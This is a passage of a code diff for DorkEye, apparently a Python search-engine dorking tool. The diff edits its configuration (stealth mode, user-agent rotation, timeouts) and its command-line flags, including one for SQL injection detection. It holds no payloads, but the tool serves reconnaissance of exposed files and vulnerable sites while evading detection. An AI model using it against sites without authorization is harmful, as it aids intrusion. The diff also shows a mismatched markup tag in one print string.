 # Enable stealth mode (slower but safer)
 stealth_mode: false
 
-# Maximum file size to check (in bytes)
-max_file_size_check: 52428800  # 50MB
+# Request timeout in seconds
+request_timeout: 10
+
+# Maximum retries per request
+max_retries: 3
 
 # Rotate user agents
 user_agent_rotation: true
@@ -772,9 +1253,12 @@ user_agent_rotation: true
         f.write(config_yaml)
 
     console.print("[green][✓] Sample config created: dorkeye_config.yaml[/green]")
+
+
+
 def main():
     parser = argparse.ArgumentParser(
-        description="DorkEye v3.1 - Advanced Dorking Tool with SQLi Detection",
+        description="DorkEye v3.8 - Advanced Dorking Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -788,21 +1272,15 @@ Examples:
 
     parser.add_argument("-d", "--dork", help="Single dork or file containing dorks")
     parser.add_argument("-o", "--output", help="Output filename (without extension)")
-    parser.add_argument("-c", "--count", type=int, default=50,
-                       help="Results per dork (default: 50)")
+    parser.add_argument("-c", "--count", type=int, default=50, help="Results per dork (default: 50)")
     parser.add_argument("--config", help="Configuration file (YAML or JSON)")
-    parser.add_argument("--no-analyze", action="store_true",
-                       help="Disable file analysis")
-    parser.add_argument("--sqli", action="store_true",
-                       help="Enable SQL injection detection")
-    parser.add_argument("--stealth", action="store_true",
-                       help="Enable stealth mode (slower, safer)")
-    parser.add_argument("--blacklist", nargs="+",
-                       help="Extensions to blacklist (e.g., .pdf .doc)")
-    parser.add_argument("--whitelist", nargs="+",
-                       help="Extensions to whitelist (e.g., .pdf .xls)")
-    parser.add_argument("--create-config", action="store_true",
-                       help="Create sample configuration file")
+    parser.add_argument("--no-analyze", action="store_true", help="Disable file analysis")
+    parser.add_argument("--sqli", action="store_true", help="Enable SQL injection detection")
+    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (slower, safer)")
+    parser.add_argument("--no-fingerprint", action="store_true", help="Disable HTTP fingerprinting")
+    parser.add_argument("--blacklist", nargs="+", help="Extensions to blacklist (e.g., .pdf .doc)")
+    parser.add_argument("--whitelist", nargs="+", help="Extensions to whitelist (e.g., .pdf .xls)")
+    parser.add_argument("--create-config", action="store_true", help="Create sample configuration file")
 
     args = parser.parse_args()
 
@@ -831,6 +1309,9 @@ Examples:
     if args.stealth:
         config["stealth_mode"] = True
 
+    if args.no_fingerprint:
+        config["http_fingerprinting"] = False
+
     if args.blacklist:
         config["blacklist"] = args.blacklist
 
@@ -841,12 +1322,12 @@ Examples:
 
     dorks = dorkeye.process_dorks(args.dork)
     console.print(f"[bold cyan]┌─[ LOADED {len(dorks)} DORK(s) ][/bold cyan]")
-    console.print(f"[bold cyan]└─>[/bold cyan] Ready to search\n")
+    console.print(f"[bold cyan]└─>[/bold cyan] Dorking ...\n")
 
     try:
         dorkeye.run_search(dorks, args.count)
     except KeyboardInterrupt:
-        console.print("\n[yellow][!] Search interrupted by user[/yellow]")
+        console.print("\n[red][!] Search interrupted by user![/yellow]")
 
     dorkeye.print_statistics()
 
@@ -859,4 +1340,3 @@ Examples:
 
 if __name__ == "__main__":
     main()
-    
